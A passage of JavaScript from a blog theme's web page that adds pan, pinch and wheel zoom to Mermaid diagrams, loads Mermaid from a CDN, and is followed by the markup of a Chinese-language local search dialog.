    const nx = px - (px - vb[0]) * factor
    const ny = py - (py - vb[1]) * factor
    return [nx, ny, w, h]
  }

  const initMermaidGestures = wrap => {
    const svg = wrap.querySelector('svg')
    if (!svg) return

    // Ensure viewBox exists so gestures always work
    const initVb = getSvgViewBox(svg)
    wrap.__mermaidInitViewBox = initVb
    wrap.__mermaidCurViewBox = initVb.slice()
    setSvgViewBox(svg, initVb)

    // Avoid binding multiple times on themeChange/pjax
    if (wrap.__mermaidGestureBound) return
    wrap.__mermaidGestureBound = true

    // Helper: map client (viewport) coordinate -> viewBox coordinate
    const clientToViewBox = (clientX, clientY) => {
      const rect = svg.getBoundingClientRect()
      const vb = wrap.__mermaidCurViewBox || getSvgViewBox(svg)
      const x = vb[0] + (clientX - rect.left) * (vb[2] / rect.width)
      const y = vb[1] + (clientY - rect.top) * (vb[3] / rect.height)
      return { x, y, rect, vb }
    }

    const state = {
      pointers: new Map(),
      startVb: null,
      startDist: 0,
      startCenter: null
    }

    const clampVb = vb => {
      const init = wrap.__mermaidInitViewBox || vb
      const minW = init[2] * 0.1
      const maxW = init[2] * 10
      const minH = init[3] * 0.1
      const maxH = init[3] * 10
      vb[2] = clamp(vb[2], minW, maxW)
      vb[3] = clamp(vb[3], minH, maxH)
      return vb
    }

    const setCurVb = vb => {
      vb = clampVb(vb)
      wrap.__mermaidCurViewBox = vb
      setSvgViewBox(svg, vb)
    }

    const onPointerDown = e => {
      // Allow only primary button for mouse
      if (e.pointerType === 'mouse' && e.button !== 0) return
      svg.setPointerCapture(e.pointerId)
      state.pointers.set(e.pointerId, { x: e.clientX, y: e.clientY })

      if (state.pointers.size === 1) {
        state.startVb = (wrap.__mermaidCurViewBox || getSvgViewBox(svg)).slice()
      } else if (state.pointers.size === 2) {
        const pts = [...state.pointers.values()]
        const dx = pts[0].x - pts[1].x
        const dy = pts[0].y - pts[1].y
        state.startDist = Math.hypot(dx, dy)
        state.startVb = (wrap.__mermaidCurViewBox || getSvgViewBox(svg)).slice()
        state.startCenter = { x: (pts[0].x + pts[1].x) / 2, y: (pts[0].y + pts[1].y) / 2 }
      }
    }

    const onPointerMove = e => {
      if (!state.pointers.has(e.pointerId)) return
      state.pointers.set(e.pointerId, { x: e.clientX, y: e.clientY })

      // Pan with 1 pointer
      if (state.pointers.size === 1 && state.startVb) {
        const p = [...state.pointers.values()][0]
        const prev = { x: e.clientX - e.movementX, y: e.clientY - e.movementY }
        // movementX/Y unreliable on touch, compute from stored last position
        const last = wrap.__mermaidLastSinglePointer || p
        const dxClient = p.x - last.x
        const dyClient = p.y - last.y
        wrap.__mermaidLastSinglePointer = p

        const { rect } = clientToViewBox(p.x, p.y)
        const vb = (wrap.__mermaidCurViewBox || getSvgViewBox(svg)).slice()
        const dx = dxClient * (vb[2] / rect.width)
        const dy = dyClient * (vb[3] / rect.height)
        setCurVb([vb[0] - dx, vb[1] - dy, vb[2], vb[3]])
        return
      }

      // Pinch zoom with 2 pointers
      if (state.pointers.size === 2 && state.startVb && state.startDist > 0) {
        const pts = [...state.pointers.values()]
        const dx = pts[0].x - pts[1].x
        const dy = pts[0].y - pts[1].y
        const dist = Math.hypot(dx, dy)
        if (!dist) return
        const factor = state.startDist / dist // dist bigger => zoom in (viewBox smaller)

        const cx = (pts[0].x + pts[1].x) / 2
        const cy = (pts[0].y + pts[1].y) / 2
        const centerClient = { x: cx, y: cy }

        const pxy = clientToViewBox(centerClient.x, centerClient.y)
        const cpx = pxy.x
        const cpy = pxy.y

        const vb = zoomAtPoint(state.startVb, factor, cpx, cpy)
        setCurVb(vb)
      }
    }

    const onPointerUpOrCancel = e => {
      state.pointers.delete(e.pointerId)
      if (state.pointers.size === 0) {
        state.startVb = null
        state.startDist = 0
        state.startCenter = null
        wrap.__mermaidLastSinglePointer = null
      } else if (state.pointers.size === 1) {
        // reset single pointer baseline to avoid jump
        wrap.__mermaidLastSinglePointer = [...state.pointers.values()][0]
      }
    }

    // Wheel zoom (mouse/trackpad)
    const onWheel = e => {
      // ctrlKey on mac trackpad pinch; we treat both as zoom
      e.preventDefault()
      const delta = e.deltaY
      const zoomFactor = delta > 0 ? 1.1 : 0.9
      const { x, y } = clientToViewBox(e.clientX, e.clientY)
      const vb = (wrap.__mermaidCurViewBox || getSvgViewBox(svg)).slice()
      setCurVb(zoomAtPoint(vb, zoomFactor, x, y))
    }

    const onDblClick = () => {
      const init = wrap.__mermaidInitViewBox
      if (!init) return
      wrap.__mermaidCurViewBox = init.slice()
      setSvgViewBox(svg, init)
    }

    svg.addEventListener('pointerdown', onPointerDown)
    svg.addEventListener('pointermove', onPointerMove)
    svg.addEventListener('pointerup', onPointerUpOrCancel)
    svg.addEventListener('pointercancel', onPointerUpOrCancel)
    svg.addEventListener('wheel', onWheel, { passive: false })
    svg.addEventListener('dblclick', onDblClick)
  }

  const runMermaid = ele => {
    window.loadMermaid = true
    const theme = document.documentElement.getAttribute('data-theme') === 'dark' ? 'dark' : 'default'

    ele.forEach((item, index) => {
      const mermaidSrc = item.firstElementChild

      // Clear old render (themeChange/pjax will rerun)
      const oldSvg = item.querySelector('svg')
      if (oldSvg) oldSvg.remove()
      item.__mermaidGestureBound = false

      const config = mermaidSrc.dataset.config ? JSON.parse(mermaidSrc.dataset.config) : {}
      if (!config.theme) {
        config.theme = theme
      }
      const mermaidThemeConfig = `%%{init: ${JSON.stringify(config)}}%%\n`
      const mermaidID = `mermaid-${index}`
      const mermaidDefinition = mermaidThemeConfig + mermaidSrc.textContent

      const renderFn = mermaid.render(mermaidID, mermaidDefinition)
      const renderMermaid = svg => {
        mermaidSrc.insertAdjacentHTML('afterend', svg)
        if (true) initMermaidGestures(item)
        item.__mermaidOriginalSvg = svg
        if (true) attachMermaidViewerButton(item)
      }


      // mermaid v9 and v10 compatibility
      typeof renderFn === 'string' ? renderMermaid(renderFn) : renderFn.then(({ svg }) => renderMermaid(svg))
    })
  }

  const codeToMermaid = () => {
    const codeMermaidEle = document.querySelectorAll('pre > code.mermaid')
    if (codeMermaidEle.length === 0) return

    codeMermaidEle.forEach(ele => {
      const preEle = document.createElement('pre')
      preEle.className = 'mermaid-src'
      preEle.hidden = true
      preEle.textContent = ele.textContent
      const newEle = document.createElement('div')
      newEle.className = 'mermaid-wrap'
      newEle.appendChild(preEle)
      ele.parentNode.replaceWith(newEle)
    })
  }

  const loadMermaid = () => {
    if (false) codeToMermaid()
    const $mermaid = document.querySelectorAll('#article-container .mermaid-wrap')
    if ($mermaid.length === 0) return

    const runMermaidFn = () => runMermaid($mermaid)
    btf.addGlobalFn('themeChange', runMermaidFn, 'mermaid')
    window.loadMermaid ? runMermaidFn() : btf.getScript('https://cdn.jsdelivr.net/npm/mermaid@11.12.2/dist/mermaid.min.js').then(runMermaidFn)
  }

  btf.addGlobalFn('encrypt', loadMermaid, 'mermaid')
  window.pjax ? loadMermaid() : document.addEventListener('DOMContentLoaded', loadMermaid)
})()</script></div><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><i class="fas fa-spinner fa-pulse" id="loading-status" hidden="hidden"></i><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="text-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  数据加载中</span></div><div class="local-search-input"><input placeholder="搜索文章" type="text"/></div><hr/><div id="local-search-results"></div><div class="ais-Pagination" id="local-search-pagination" style="display:none;"><ul class="ais-Pagination-list"></ul></div><div id="local-search-stats"></div></div><div id="search-mask"></div><script src="/js/search/local-search.js?v=5.5.4"></script></div></div></body></html>